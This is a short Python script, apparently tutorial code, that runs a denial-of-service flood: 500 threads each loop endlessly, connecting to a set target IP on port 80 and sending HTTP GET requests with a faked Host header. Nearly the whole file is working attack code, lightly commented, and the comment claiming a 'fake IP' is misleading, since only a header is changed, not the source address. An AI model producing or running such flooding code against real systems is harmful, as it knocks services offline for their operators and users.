""" Import the necessary libraries """
import socket
import threading

""" Create a fake IP address, but creating one will not make us anonymous.Select the
target IP address. The one shown here is the local router of my home """
target = '10.0.0.138'
fake_ip = '182.21.20.32'
port = 80

""" Multithreading concept is used in this DDoS attack.The function attack()
 will run in each of the threads created.It starts an endless loop, 
 within which it creates a socket, connects to the target and 
 sends an HTTP request over and over again."""
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

""" Create multiple threads """
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

""" The concept of multithreading is to multiple requests at once against sending requests 
one after the other using the function using a loop."""